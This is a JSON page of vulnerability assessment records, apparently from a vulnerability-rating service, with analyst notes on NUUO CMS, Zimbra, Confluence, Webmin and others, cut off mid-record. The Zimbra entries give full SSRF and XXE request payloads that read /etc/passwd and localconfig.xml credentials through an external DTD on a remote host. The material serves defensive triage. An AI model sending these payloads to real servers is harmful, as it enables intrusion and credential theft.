{
  "links": {
    "next": {
      "href": "/v1/assessments?expand=tags&page=1&size=100&sort=created%3Aasc"
    },
    "self": {
      "href": "/v1/assessments?expand=tags&page=0&size=100&sort=created%3Aasc"
    }
  },
  "data": [
    {
      "id": "b7b6fcf1-23b6-4b08-81b3-da6292ebec6b",
      "editorId": "e426cc12-067c-41a8-83c0-029757da0dbf",
      "topicId": "7346a351-e2dc-471c-a4ab-5d9bd6beab0a",
      "created": "2019-05-09T17:57:10.381541Z",
      "revisionDate": "2020-03-15T04:22:22.595044Z",
      "document": "## Details\n\nLarge number of devices affected. This exploit is useful for determining valid user names.",
      "score": 1,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 5,
        "urgent-to-patch": 4,
        "confidence-in-ratings": 5,
        "offensive-application": "remote"
      },
      "tags": []
    },
    {
      "id": "f719a3b6-ddb3-4b3e-bea3-5f9bbf709177",
      "editorId": "38119b46-8f40-4697-9429-e6e856507248",
      "topicId": "32e430ea-dcea-4ed6-9203-86a46cda1a06",
      "created": "2019-05-09T17:57:11.218596Z",
      "revisionDate": "2020-03-15T04:22:22.595044Z",
      "document": "## Details\r\n\r\nDetails from [module documentation](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/auxiliary/gather/nuuo_cms_bruteforce.md) in Metasploit.\r\n\r\nThe NUUO CMS protocol uses session tokens in a similar way to HTTP cookies. As mentioned in the summary, if a USERLOGIN request is sent with a correct username and password, a \"User-Session-No\" token will be returned. The number returned is composed of 8 digits, so if an attacker wanted to guess it, they would have 10 million possibilities, and would be able to bruteforce it on average after 5 million tries.\r\n\r\nThe function responsible for creating a new user is at offset 0x454E80 in CMS_Server.exe version 2.1. It sets up a new user object and returns the session token to the calling function. This function has what is probably a coding error - the number returned is actually not a number, but the heap address of the user object created by invoking \"new()\" in the user object class. An assembly snippet is shown below:\r\n\r\n```\r\n.text:00454E80 000                 push    0FFFFFFFFh\r\n.text:00454E82 004                 push    offset loc_5E2013\r\n.text:00454E87 008                 mov     eax, large fs:0\r\n.text:00454E8D 008                 push    eax\r\n.text:00454E8E 00C                 sub     esp, 8\r\n.text:00454E91 014                 push    ebp\r\n.text:00454E92 018                 push    esi\r\n.text:00454E93 01C                 push    edi\r\n.text:00454E94 020                 mov     eax, dword_68D134\r\n.text:00454E99 020                 xor     eax, esp\r\n.text:00454E9B 020                 push    eax\r\n.text:00454E9C 024                 lea     eax, [esp+24h+var_C]\r\n.text:00454EA0 024                 mov     large fs:0, eax\r\n.text:00454EA6 024                 mov     ebp, ecx\r\n.text:00454EA8 024                 lea     edi, [ebp+43Ch]\r\n.text:00454EAE 024                 push    edi             ; lpCriticalSection_EnterCriticalSection\r\n.text:00454EAF 028                 mov     [esp+28h+var_10], edi\r\n.text:00454EB3 028                 call    ds:EnterCriticalSection\r\n.text:00454EB9 024                 push    1B8h            ; unsigned int\r\n.text:00454EBE 028                 mov     [esp+28h+var_4], 0\r\n.text:00454EC6 028                 call    ??2@YAPAXI@Z    ; new() operator, returns object in eax\r\n(...)\r\n```\r\n\r\nAfter the call to ??2@YAPAXI@Z in .text:00454EC6, the session number is returned to the calling function (sub_457100), which then stores it and sends it back to the client as the valid session number:\r\n\r\n```\r\nNUCM/1.0 200 OK\r\nUser-Valid: %d\r\nServer-Version: %s\r\nIni-Version: %d\r\nLicense-Number: %d\r\nUser-Session-No: %u <---- session number, which is a hexadecimal memory address converted to decimal\r\n```\r\n\r\nThese session numbers (tokens) are not that easy to predict, however after collecting thousands of samples I was able to build a table of the most common occurrences, which reduces the possibilities from 10 million to about 1.2 million. In practice, the tokens can usually be guessed between in less than 500,000 attempts - an improvement of 95% over standard bruteforcing. It is likely this can be further improved with some deeper analysis, but due to time constraints this was not investigated further. The tables used to do the bruteforcing are in Appendix #C.\r\n\r\nThis attack is perfectly feasible despite the high number of attempts needed. Firstly, there is no bruteforce protection on the CMS server, so we can just flood it with requests and find the session number in less than an hour.\r\nSecondly, due to the nature of this application, it is normal to have the software clients logged in for a long amount of time (days, weeks) in order to monitor the video cameras controlled by CMS.\r\n\r\nIt is worth noticing that when a user logs in, the session has to be maintained by periodically sending a PING request. To bruteforce the session, we send each guess with a PING request until a 200 OK message is received.",
      "score": 1,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 2,
        "urgent-to-patch": 4,
        "confidence-in-ratings": 3,
        "offensive-application": "not sure"
      },
      "tags": []
    },
    {
      "id": "9048619e-775f-4120-9973-37777bec937e",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "111b0b1f-b407-4550-a7f6-54da53cfbdae",
      "created": "2019-05-09T17:57:12.872703Z",
      "revisionDate": "2020-03-15T04:22:22.595044Z",
      "document": "Allows Admin to load unsigned driver, but that is already possible other ways.",
      "score": 0,
      "metadata": {
        "attacker-value": 2,
        "exploitability": 4,
        "urgent-to-patch": 3,
        "confidence-in-ratings": 5,
        "effort-to-develop-exploit": 2
      },
      "tags": []
    },
    {
      "id": "c7f97e96-2ea5-48ed-9619-d623d9b79133",
      "editorId": "38119b46-8f40-4697-9429-e6e856507248",
      "topicId": "c984f54d-dde6-486a-a81c-ca2578542809",
      "created": "2019-05-09T17:57:14.986067Z",
      "revisionDate": "2020-03-15T04:22:22.595044Z",
      "document": "## Details\n\nAccording to the blog post [A Saga of Code Executions on Zimbra](https://blog.tint0.com/2019/03/a-saga-of-code-executions-on-zimbra.html) by An Trinh the SSRF vulnerability occurs during the handling of ProxyServlet requests. The diff to fix the server side request forgery issues can be found in Zimbra's github page for the [zm-mailbox repository](https://github.com/Zimbra/zm-mailbox/commit/291ab91fb4a6772899252e1ea0993094a6d54251#diff-9810ac0443103a17924be1842a6d9966). The diff for `ProxyServlet.java` moves a few checks outside of a conditional so that the checks are always performed.\n\nThe `doProxy` function contains the vulnerable code. As described in the blog post user input is used to determine whether the request will be treated as an admin request. Line 188 in `doProxy` calls `isAdminRequest`:\n\n```\n186     private void doProxy(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n187         ZimbraLog.clearContext();\n188         boolean isAdmin = isAdminRequest(req);\n189         AuthToken authToken = isAdmin ?\n190                 getAdminAuthTokenFromCookie(req, resp, true) : getAuthTokenFromCookie(req, resp, true);\n191         if (authToken == null) {\n192             String zAuthToken = req.getParameter(QP_ZAUTHTOKEN);\n193             if (zAuthToken != null) {\n```\n\nThe following is the `isAdminRequest`:\n\n```\n180     protected boolean isAdminRequest(HttpServletRequest req) {\n181         return req.getServerPort() == LC.zimbra_admin_service_port.intValue();\n182     }\n```\n\nThe `getServerPort` function returns the port number specified in the Host header and `LC.zimbra_admin_service_port` is 7071. If a request is sent with port 7071 in the Host header then the `isAdmin` variable will be set to true in `doProxy`. After `isAdmin` is set, an authentication token is read from the request. Since we want the request to be treated as an admin request we are interested in the `getAdminAuthTokenFromCookie` function. The function ends up checking for a valid cookie with the `ZM_ADMIN_AUTH_TOKEN` key. Note: A valid token is required but the key for the token should be changed to `ZM_ADMIN_AUTH_TOKEN` when exploiting the SSRF vulnerability.\n\nLines 222-234 check for a proxy target and whether the request is allowed based on permissions:\n\n```\n222         // sanity check\n223         String target = req.getParameter(TARGET_PARAM);\n224         if (target == null) {\n225             resp.sendError(HttpServletResponse.SC_BAD_REQUEST);\n226             return;\n227         }\n228\n229         // check for permission\n230         URL url = new URL(target);\n231         if (!isAdmin && !checkPermissionOnTarget(url, authToken)) {\n232             resp.sendError(HttpServletResponse.SC_FORBIDDEN);\n233             return;\n234         }\n```\n\nOn line 231 we can see that if the user is an admin then the request is allowed but if the user is not an admin then a permissions check will be performed. To test the described issue, we can construct requests. The following request uses a valid user (non-admin) cookie and contains a proxy request to the admin port:\n\n```\nPOST /service/proxy?target=https://127.0.0.1:7071/ HTTP/1.1\nHost: zimbra.mylocaldomain.local:8443\nCookie: ZM_AUTH_TOKEN=0_f4c2aa41cd45987f5a459601320b5452ec993ad4_69643d33363a61303964323935332d363139642d343532612d383565352d3536346136616638393030383b6578703d31333a313535343339313631313239383b747970653d363a7a696d6272613b753d313a613b7469643d393a3635323737323132373b76657273696f6e3d31333a382e372e315f47415f313637303b637372663d313a313b;\nContent-Length: 0\n\n\n```\n\nThe response from the previous request returns a forbidden message:\n\n```\nHTTP/1.1 403 Forbidden\nDate: Wed, 03 Apr 2019 11:54:45 GMT\nContent-Type: text/html;charset=iso-8859-1\nCache-Control: must-revalidate,no-cache,no-store\nContent-Length: 245\n\n<html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html;charset=utf-8\"/>\n<title>Error 403 Forbidden</title>\n</head>\n<body><h2>HTTP ERROR 403</h2>\n<p>Problem accessing /service/proxy. Reason:\n<pre>    Forbidden</pre></p>\n</body>\n</html>\n```\n\nNext we modify the previous request, changing 8443 to 7071 and ZM_AUTH_TOKEN to ZM_ADMIN_AUTH_TOKEN, and resend it:\n\n```\nPOST /service/proxy?target=https://127.0.0.1:7071/ HTTP/1.1\nHost: zimbra.mylocaldomain.local:7071\nCookie: ZM_ADMIN_AUTH_TOKEN=0_f4c2aa41cd45987f5a459601320b5452ec993ad4_69643d33363a61303964323935332d363139642d343532612d383565352d3536346136616638393030383b6578703d31333a313535343339313631313239383b747970653d363a7a696d6272613b753d313a613b7469643d393a3635323737323132373b76657273696f6e3d31333a382e372e315f47415f313637303b637372663d313a313b;\nContent-Length: 0\n\n\n```\n\nThe response to the modified request does not contain a forbidden message this time and is instead a redirect the zimbraAdmin page:\n\n```\nHTTP/1.1 302 Found\nDate: Wed, 03 Apr 2019 11:57:52 GMT\nContent-Type: text/html;charset=utf-8\nDate: Wed, 03 Apr 2019 11:57:52 GMT\nX-Frame-Options: SAMEORIGIN\nExpires: Tue, 24 Jan 2000 20:46:50 GMT\nLocation: https://127.0.0.1:7071/zimbraAdmin\nContent-Length: 0\n\n```",
      "score": 1,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 3,
        "urgent-to-patch": 5,
        "used-successfully": 5,
        "confidence-in-ratings": 5,
        "effort-to-develop-exploit": 3
      },
      "tags": []
    },
    {
      "id": "c5767bc6-c204-4b99-ab97-3ca67e66b759",
      "editorId": "38119b46-8f40-4697-9429-e6e856507248",
      "topicId": "0de629aa-dabb-4803-9039-23808f323aaf",
      "created": "2019-05-09T17:57:15.478695Z",
      "revisionDate": "2020-03-15T04:22:22.595044Z",
      "document": "## Details\n\nAccording to the blog post [A Saga of Code Executions on Zimbra](https://blog.tint0.com/2019/03/a-saga-of-code-executions-on-zimbra.html) by An Trinh the XXE vulnerability occurs during the handling of Autodiscover requests. The commit diff for the changes that fixed the XXE issue can be found in Zimbra's github page for the [zm-mailbox repository](https://github.com/Zimbra/zm-mailbox/commit/e859950cea04f93ea101a6bdcc7ac4912efcef8e#diff-d9e2be9710e802c4002ed02015522784). In the `AutoDiscoverServlet.java` file the changes show modifications to wrap `DocumentBuilderFactory` in a function that disables multiple features for the instantiated factory.\n\nBy viewing the `AutoDiscoverServlet.java` file before the changes and tracking how `DocumentBuilderFactory` is used we can find the XXE vulnerability. One instance of `DocumentBuilderFactory` is in the `doPost` function. Lines 168-201 shows the beginning of the `doPost` function.\n\n```\n168     public void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n169         ZimbraLog.clearContext();\n170         addRemoteIpToLoggingContext(req);\n171\n172         log.info(\"Handling autodiscover request...\");\n173\n174         byte[] reqBytes = null;\n175         reqBytes = ByteUtil.getContent(req.getInputStream(), req.getContentLength());\n176         if (reqBytes == null) {\n177             log.warn(\"No content found in the request\");\n178             sendError(resp, 600, \"No content found in the request\");\n179             return;\n180         }\n181         String content = new String(reqBytes, \"UTF-8\");\n<snip>\n196\n197         try {\n198             DocumentBuilderFactory docBuilderFactory = DocumentBuilderFactory.newInstance();\n199             DocumentBuilder docBuilder = docBuilderFactory.newDocumentBuilder();\n200             Document doc = docBuilder.parse(new InputSource(new StringReader(content)));\n201             NodeList nList = doc.getElementsByTagName(\"Request\");\n```\n\nOn line 200 the request body contents are parse by the application. Since the request contents are parse on line 200 before any other checks (other than an empty contents check) we should be able to get XXE at this location of the code. The following request will trigger the XXE:\n\n```\nPOST /service/autodiscover HTTP/1.1\nHost: zimbra.mylocaldomain.local:8443\nContent-Length: 102\n\n\n<!DOCTYPE foo [<!ELEMENT foo ANY>\n<!ENTITY % test SYSTEM \"http://172.22.222.136:8000/test\">\n%test;]>\n```\n\nThe following is the response from the server:\n\n```\nHTTP/1.1 400 Body cannot be parsed\nDate: Tue, 02 Apr 2019 13:14:39 GMT\nContent-Type: text/html;charset=iso-8859-1\nCache-Control: must-revalidate,no-cache,no-store\nContent-Length: 276\n\n<html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html;charset=utf-8\"/>\n<title>Error 400 Body cannot be parsed</title>\n</head>\n<body><h2>HTTP ERROR 400</h2>\n<p>Problem accessing /service/autodiscover. Reason:\n<pre>    Body cannot be parsed</pre></p>\n</body>\n</html>\n```\n\nAlthough the response does not contain any useful information, we can see that the server reached out to request the file specified in the `test` entity:\n\n```\n$ python -m SimpleHTTPServer 8000\nServing HTTP on 0.0.0.0 port 8000 ...\n172.22.222.111 - - [02/Apr/2019 08:13:26] code 404, message File not found\n172.22.222.111 - - [02/Apr/2019 08:13:26] \"GET /test HTTP/1.1\" 404 -\n```\n\nSince we can get the application to reach out for a file we can include an external DTD file to include additional entities. However, An Trinh's blog post mentions that the vulnerability allows direct file extraction through the response. Our response does not contain anything useful so far. In lines 203-234 we can see xml data being checked for `EmailAddress` and `AcceptableResponseSchema`. There are also some error checks based on the data in those fields.\n\n```\n203             for (int i = 0; i < nList.getLength(); i++) {\n204                 Node node = nList.item(i);\n205                 if (node.getNodeType() == Node.ELEMENT_NODE) {\n206                     Element element = (Element) node;\n207                     email = getTagValue(\"EMailAddress\", element);\n208                     responseSchema = getTagValue(\"AcceptableResponseSchema\", element);\n209\n210                     if (email != null)\n211                         break;\n212                 }\n213             }\n214         } catch (Exception e) {\n215             log.warn(\"cannot parse body: %s\", content);\n216             sendError(resp, HttpServletResponse.SC_BAD_REQUEST, \"Body cannot be parsed\");\n217             return;\n218         }\n219\n220         //Return an error if there's no email address specified!\n221         if (email == null || email.length() == 0) {\n222             log.warn(\"No Email address is specified in the Request, %s\", content);\n223             sendError(resp, HttpServletResponse.SC_BAD_REQUEST, \"No Email address is specified in the Request\");\n224             return;\n225         }\n226\n227         //Return an error if the response schema doesn't match ours!\n228         if (responseSchema != null && responseSchema.length() > 0) {\n229\n230             if (!(responseSchema.equals(NS_MOBILE) || responseSchema.equals(NS_OUTLOOK))) {\n231                 log.warn(\"Requested response schema not available \" + responseSchema);\n232                 sendError(resp, HttpServletResponse.SC_SERVICE_UNAVAILABLE,\n233                         \"Requested response schema not available \" + responseSchema);\n234                 return;\n```\n\nChecks for the data in `EMailAddress` and `AcceptableResponseSchema` are performed on lines 221, 228, and 230. If a response schema is specified but it is not one of the predefined values then lines 232-233 are executed, which includes the provided response schema in the error messages. The following request can be used to verify the described behavior:\n\n```\nPOST /service/autodiscover HTTP/1.1\nHost: zimbra.mylocaldomain.local:8443\nContent-Length: 117\n\n<Request>\n<EMailAddress>email</EMailAddress>\n<AcceptableResponseSchema>mytest</AcceptableResponseSchema>\n</Request>\n```\n\nAs shown in the following response `mytest` is reflected back:\n\n```\nHTTP/1.1 503 Requested response schema not available mytest\nDate: Tue, 02 Apr 2019 13:34:59 GMT\nContent-Type: text/html;charset=iso-8859-1\nCache-Control: must-revalidate,no-cache,no-store\nContent-Length: 326\n\n<html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html;charset=utf-8\"/>\n<title>Error 503 Requested response schema not available mytest</title>\n</head>\n<body><h2>HTTP ERROR 503</h2>\n<p>Problem accessing /service/autodiscover. Reason:\n<pre>    Requested response schema not available mytest</pre></p>\n</body>\n</html>\n```\n\nTo retrieve a file from the system we can define an entity and include it as the `AcceptableResponseSchema` as shown in the following request:\n\n```\nPOST /service/autodiscover HTTP/1.1\nHost: zimbra.mylocaldomain.local:8443\nContent-Length: 198\n\n<!DOCTYPE foo [<!ELEMENT foo ANY>\n<!ENTITY test SYSTEM \"file:///etc/passwd\">]>\n<Request>\n<EMailAddress>email</EMailAddress>\n<AcceptableResponseSchema>&test;</AcceptableResponseSchema>\n</Request>\n```\n\nThe response will contain the data in `/etc/passwd`:\n\n```\n<snip>\n<html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html;charset=utf-8\"/>\n<title>Error 503 Requested response schema not available root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\n<snip>\n```\n\nThe blog post mentioned retrieving the `localconfig.xml` file to get credentials. To read the `localconfig.xml` file an external DTD file was used. The following request was used:\n\n```\nPOST /service/autodiscover HTTP/1.1\nHost: zimbra.mylocaldomain.local:8443\nContent-Length: 229\n\n<!DOCTYPE foo [<!ELEMENT foo ANY>\n<!ENTITY % remote SYSTEM \"http://172.22.222.136:8000/test\">\n%remote;\n]>\n<Request>\n<EMailAddress>email</EMailAddress>\n<AcceptableResponseSchema>&myfile;</AcceptableResponseSchema>\n</Request>\n```\n\nThe `myfile` entity is defined in the external DTD. The full contents of the external DTD is the following:\n\n```\n<!ENTITY % test SYSTEM \"file:///opt/zimbra/conf/localconfig.xml\">\n<!ENTITY % eval \"<!ENTITY myfile '<![CDATA[%test;]]>'>\">\n%eval;\n```\n\nThe following is a partial server response:\n\n```\n<snip>\n<html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html;charset=utf-8\"/>\n<title>Error 503 Requested response schema not available &lt;localconfig&gt;\n  &lt;key name=&quot;ssl_",
      "score": 1,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 3,
        "urgent-to-patch": 5,
        "used-successfully": 5,
        "confidence-in-ratings": 3,
        "effort-to-develop-exploit": 3
      },
      "tags": []
    },
    {
      "id": "8c8e897a-3c63-4946-b8d5-5e8e9b6d809d",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "038b624d-9a75-41c5-83d1-3492aa83fbcb",
      "created": "2019-05-09T17:57:18.367962Z",
      "revisionDate": "2020-03-15T04:22:22.595044Z",
      "document": "Unrealistic privilege escalation scenario, fixed in AOSP 2 years ago, but maybe usable in older versions.",
      "score": 1,
      "metadata": {
        "attacker-value": 1,
        "exploitability": 2,
        "urgent-to-patch": 2,
        "confidence-in-ratings": 5,
        "effort-to-develop-exploit": 4
      },
      "tags": []
    },
    {
      "id": "bf197e08-0dc9-47a4-9431-29df5c73f8b5",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "5cc0138a-6253-4e7e-802d-3dc1662f8243",
      "created": "2019-05-09T17:57:18.81999Z",
      "revisionDate": "2020-03-15T04:22:22.595044Z",
      "document": "ASLR Bypass, vendor says they would fix in next versions.",
      "score": 1,
      "metadata": {
        "attacker-value": 2,
        "exploitability": 1,
        "urgent-to-patch": 4,
        "confidence-in-ratings": 5,
        "effort-to-develop-exploit": 5
      },
      "tags": []
    },
    {
      "id": "5a258a43-dfc8-47b3-aef3-81893fd5647a",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "4e31f98f-98c6-4bea-8a83-6dce4358d2e8",
      "created": "2019-05-09T17:57:19.577044Z",
      "revisionDate": "2020-03-15T04:22:22.595044Z",
      "document": "Vendor reason for not patching immediately: Attacker requires too much control in advance.",
      "score": 1,
      "metadata": {
        "attacker-value": 1,
        "exploitability": 1,
        "urgent-to-patch": 5,
        "confidence-in-ratings": 4,
        "effort-to-develop-exploit": 4
      },
      "tags": []
    },
    {
      "id": "a6930147-c83a-4a06-867b-2e4bff5793b9",
      "editorId": "4279447e-31e4-49c4-9efc-c7607f30296b",
      "topicId": "a29f033f-47f8-4658-b470-4a3f541e9175",
      "created": "2019-05-09T17:57:20.373136Z",
      "revisionDate": "2020-03-15T04:22:22.595044Z",
      "document": "This requires IPv6 and particular settings to be enabled\r\n\r\nWaiting for machine to boot. This may take a few minutes...\r\n    default: SSH address: 127.0.0.1:2222\r\n    default: SSH username: vagrant\r\n    default: SSH auth method: private key\r\n```\r\n\r\nIt seems you have to configure the virtual switch with a virtual serial port.\r\n\r\n## VM Contents:\r\n\r\nThere are only a few EXT3 filesystems that have useful data in the VMDK image. I think the most interesting bits are going to be inside of nxos.9.2.2.bin which is perhaps decoded or interpreted by the kernel or bootloader.  The boot screen in the VM looks like it uses a modified version of GRUB and the Linux kernel, though my current environment has insufficient memory to make it actually boot.\r\n\r\n```\r\n><fs> add-ro ## Vulnerable targets:\r\n\r\nIt's not clear if the 9000v virtual switch is vulnerable but that is the easiest to target for now, since it does not need special hardware.\r\n\r\nThe setup is here: https://www.cisco.com/c/en/us/td/docs/switches/datacenter/nexus9000/sw/7-x/nx-osv/configuration/guide/b_Cisco_Nexus_9000v/b_Cisco_Nexus_9000v_chapter_011.html\r\n\r\n## NXOSV VM download\r\n\r\nDownloading the 'Vagrant' image and running it with a basic Vagrantfile showed this output, which hung forever:\r\n\r\n```\r\nBringing machine 'default' up with 'virtualbox' provider...\r\n==> default: Clearing any previously set forwarded ports...\r\n==> default: Clearing any previously set network interfaces...\r\n==> default: Preparing network interfaces based on configuration...\r\n    default: Adapter 1: nat\r\n==> default: Forwarding ports...\r\n    default: 22 (guest) => 2222 (host) (adapter 1)\r\n==> default: Booting VM...\r\n==> default: box-disk1.vmdk\r\n><fs> run\r\n><fs> list-filesystems\r\n/dev/sda1: vfat\r\n/dev/sda2: ext3\r\n/dev/sda3: ext3\r\n/dev/sda4: ext3\r\n/dev/sda5: ext3\r\n/dev/sda6: e\r\nboot\r\ncfglabel.sysmgr\r\ndebug\r\ndme\r\nlicenses\r\nlinux\r\nlog\r\nlost+foundxt3\r\n/dev/sda7: ext3\r\n><fs> mount /dev/sda3 /\r\n><fs> ls /\r\nlost+found\r\n><fs> mount /dev/sda1 /\r\n><fs> ls /\r\nEFI\r\n><fs> mount /dev/sda2 /\r\n><fs> ls /\r\nlost+found\r\n><fs> mount /dev/sda3 /\r\n><fs> ls /\r\nlost+found\r\n><fs> mount /dev/sda4 /\r\n><fs> ls /\r\nnxos.9.2.2.bin\r\n><fs> mount /dev/sda5 /\r\n><fs> ls /\r\nlost+found\r\n><fs> mount /dev/sda6 /\r\n><fs> ls /\r\nascii\r\nbin\r\nno-erase\r\n><fs> mount /dev/sda7 /\r\n><fs> ls /\r\nlost+found\r\n```\r\n\r\nI copied out the .bin file, which appears to be another filesystem.\r\n\r\n```\r\n><fs> mount /dev/sda4 /\r\n><fs> copy-out /nxos.9.2.2.bin .\r\n\r\n$ file nxos.9.2.2.bin\r\nnxos.9.2.2.bin: DOS/MBR boot sector\r\n```\r\n\r\n```\r\nbinwalk ./nxos.9.2.2.bin\r\n--------------------------------------------------------------------------------\r\n0             0x0             Netboot image, mode 2\r\n1024          0x400           Microsoft executable, portable (PE)\r\n17844         0x45B4          gzip compressed data, maximum compression, from Unix, last modified: 1970-01-01 00:00:00 (null date)\r\n2010881       0x1EAF01        MySQL ISAM index file Version 7\r\n6283776       0x5FE200        gzip compressed data, maximum compression, from Unix, last modified: 2018-11-05 06:20:17\r\n```\r\n",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 1,
        "urgent-to-patch": 4,
        "confidence-in-ratings": 5,
        "effort-to-develop-exploit": 3
      },
      "tags": []
    },
    {
      "id": "5e8acf72-5882-4fd0-8790-764a17f1f905",
      "editorId": "38119b46-8f40-4697-9429-e6e856507248",
      "topicId": "0fd486b8-c196-4503-bcd9-16c2628dad61",
      "created": "2019-05-09T17:57:20.830454Z",
      "revisionDate": "2020-02-13T17:12:45.719724Z",
      "document": "## Details\n\nWebmin 1.900 allows authenticated users with \"Upload and Download\" module access to upload cgi files to a webroot subdirectory and the uploaded files can be executed by sending requests to the web server.",
      "score": 1,
      "metadata": {
        "attacker-value": 2,
        "exploitability": 2,
        "urgent-to-patch": 3,
        "confidence-in-ratings": 2,
        "effort-to-develop-exploit": 1
      },
      "tags": []
    },
    {
      "id": "2c6d1135-1913-415c-8709-49e061fd22da",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "a41a5c96-e824-46c8-a522-bc6534f5e54b",
      "created": "2019-05-09T17:57:21.281072Z",
      "revisionDate": "2020-03-15T04:22:22.595044Z",
      "document": "The details are pretty heavily documented on robotattack.org, so no need to reproduce them here. If you haven't updated your TLS stack to only support perfect forard secrecy (that is, you haven't updated it in the last 10 years), you're hosed. But you already were anyway.",
      "score": 1,
      "metadata": {
        "attacker-value": 2,
        "exploitability": 1,
        "urgent-to-patch": 2,
        "confidence-in-ratings": 5,
        "effort-to-develop-exploit": 2
      },
      "tags": []
    },
    {
      "id": "cd68c841-74d4-46c5-8339-903b36d2c88c",
      "editorId": "be56a709-ab70-4e82-8afc-87943f13dfe4",
      "topicId": "d432d14a-94a1-4099-b6f6-959b6ef2a545",
      "created": "2019-05-09T17:57:22.403949Z",
      "revisionDate": "2020-10-21T20:31:23.65709Z",
      "document": "A vulnerability in the installed-by-default Widget Connector macro within Atlassian Confluence provides for unauthenticated remote code execution via a network-listening web service. The attacker sends crafted JSON via an HTTP POST request to the rest/tinymce/1/macro/preview endpoint, including a malicious _template variable which triggers the vulnerable server to callback to the client on an arbitrary IP address and port.\n\nThe vulnerability affects Confluence Server before version 6.6.12, from version 6.7.0 before 6.12.3, from version 6.13.0 before 6.13.3, and from version 6.14.0 before 6.14.2.\n\nA pull request for this exploit was submitted to the Metasploit Framework on 12 April 2019. The Metasploit exploit module did not work when tested against 6.13.0.\n\n## Analysis\n\nThe nature of this exploit provides a reliable exploit onto a vulnerable server, with minimal downside of detection or crashing the target. In additon, the attacker can leverage HTTPS to encrypt the exploit attempt, bypassing network intrusion detection.\n\nOverall, I think this exploit is going to be in high use. Given the popularity of Confluence, the tendency for organizations to self-host Confluence, and the lack of downsides for an attacker to try this exploit, I think we\u2019ll see a lot of use out of this one.",
      "score": 2,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 4,
        "urgent-to-patch": 4,
        "used-successfully": 5,
        "confidence-in-ratings": 4,
        "effort-to-develop-exploit": 4
      },
      "tags": []
    },
    {
      "id": "2a5e9458-4b79-46f4-91f3-594001026307",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "6a5d3081-6fc1-4298-8a59-64e6bef7ce22",
      "created": "2019-05-09T17:57:22.865045Z",
      "revisionDate": "2020-03-15T04:22:22.595044Z",
      "document": "Not exploitable other than for crashing a browser, probably not that useful though.",
      "score": 1,
      "metadata": {
        "attacker-value": 1,
        "exploitability": 5,
        "urgent-to-patch": 1,
        "confidence-in-ratings": 3,
        "effort-to-develop-exploit": 1
      },
      "tags": []
    },
    {
      "id": "e42e9c4d-fbe2-4e1a-9a8c-8fa7d8631317",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "382a5602-3bd1-4a62-b9c4-bbbc2f0ea406",
      "created": "2019-05-09T17:57:24.687195Z",
      "revisionDate": "2020-03-15T04:22:22.595044Z",
      "document": " ",
      "score": 1,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 4,
        "urgent-to-patch": 4,
        "confidence-in-ratings": 5,
        "effort-to-develop-exploit": 2
      },
      "tags": []
    },
    {
      "id": "e7182219-230f-47f5-9af8-317403718f6a",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "2c74f0f4-d79a-41dd-8c31-8cd511a0671b",
      "created": "2019-05-09T17:57:25.15191Z",
      "revisionDate": "2020-03-15T04:22:22.595044Z",
      "document": "Project zero reason for closure: Info not valuable (attacker can view and control power settings).",
      "score": 1,
      "metadata": {
        "attacker-value": 1,
        "exploitability": 5,
        "urgent-to-patch": 1,
        "confidence-in-ratings": 5,
        "effort-to-develop-exploit": 1
      },
      "tags": []
    },
    {
      "id": "6cd9f581-ee7e-4479-9320-8e73e89a97e9",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "b3c81855-abd0-4a19-b5ca-7ea60a5837c8",
      "created": "2019-05-09T17:57:25.605267Z",
      "revisionDate": "2020-03-15T04:22:22.595044Z",
      "document": "## Details\n\nThis is possibly another 'getsystem' technique for UAC bypass.\nThe effort required to exploit this vulnerability is higher because it requires\na particular set of circumstances that are not universal.\n\nFrom the report:\n\n> My 2c: You're already an admin, it's not letting you do anything you couldn't already do, it's just not giving you a heads up (UAC warning).",
      "score": 1,
      "metadata": {
        "attacker-value": 2,
        "exploitability": 2,
        "urgent-to-patch": 3,
        "confidence-in-ratings": 5,
        "effort-to-develop-exploit": 3
      },
      "tags": []
    },
    {
      "id": "b060b28d-6524-4f96-b356-3d468514028e",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "2edc4ab7-253d-4718-8965-69c6f751557c",
      "created": "2019-05-09T17:57:26.057598Z",
      "revisionDate": "2020-03-15T04:22:22.595044Z",
      "document": "Required disabling builtin protections on ancient SW versions, EIP is always NULL.",
      "score": 1,
      "metadata": {
        "attacker-value": 1,
        "exploitability": 4,
        "urgent-to-patch": 1,
        "confidence-in-ratings": 5,
        "effort-to-develop-exploit": 2
      },
      "tags": []
    },
    {
      "id": "57eb3832-9669-4477-a778-f1c9a3b7bb27",
      "editorId": "38119b46-8f40-4697-9429-e6e856507248",
      "topicId": "03cf04ce-d3db-4e24-9b1e-9d24864ebb2e",
